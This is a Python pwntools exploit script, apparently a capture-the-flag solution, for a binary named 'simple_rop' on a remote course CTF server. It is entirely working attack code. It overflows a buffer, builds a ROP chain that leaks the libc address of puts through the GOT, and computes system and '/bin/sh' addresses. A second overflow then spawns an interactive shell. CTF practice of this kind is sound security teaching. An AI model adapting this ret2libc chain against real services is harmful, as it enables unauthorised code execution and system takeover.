#!/usr/bin/python3
from pwn import *

DEBUG = False

elf = ELF('./simple_rop')

if DEBUG:
    r = process(elf.path)
    gdb.attach(r)
    pause()
else:
    r = remote('ctf-fsi.fe.up.pt', 7008)

# STAGE 1
libc_got = 0x804a018 # GOT no GDB
main = 0x80484cd # info functions no GDB
puts_plt = 0x08048390 # info functions no GDB
puts_got = 0x804a010 # GOT no GDB

flag = 0x0804a040

padding = b"A" * 28

rop = p32(puts_plt)
rop += p32(main)
rop += p32(puts_got)

payload = padding + rop

r.recvuntil(b"flag!")
r.sendline(payload)

r.recvuntil(b"\n")
leak = r.recv(4)

puts_libc = u32(leak)

# Use https://libc.nullbyte.cat/ to get the offsets
# Query: puts -> last 3 bytes from puts_libc
libc_base = puts_libc - 0x071cd0 
system_addr = libc_base + 0x045830
binsh_addr = libc_base + 0x192352

log.info("puts@libc: 0x%x" % puts_libc)
log.info("libc base: 0x%x" % libc_base)
log.info("system@libc: 0x%x" % system_addr)
log.info("binsh@libc: 0x%x" % binsh_addr)

# STAGE 2
padding = b"A" * 20
payload = padding + p32(system_addr) + b"AAAA" + p32(binsh_addr)
r.recvuntil(b"flag!")
r.sendline(payload)

r.interactive()

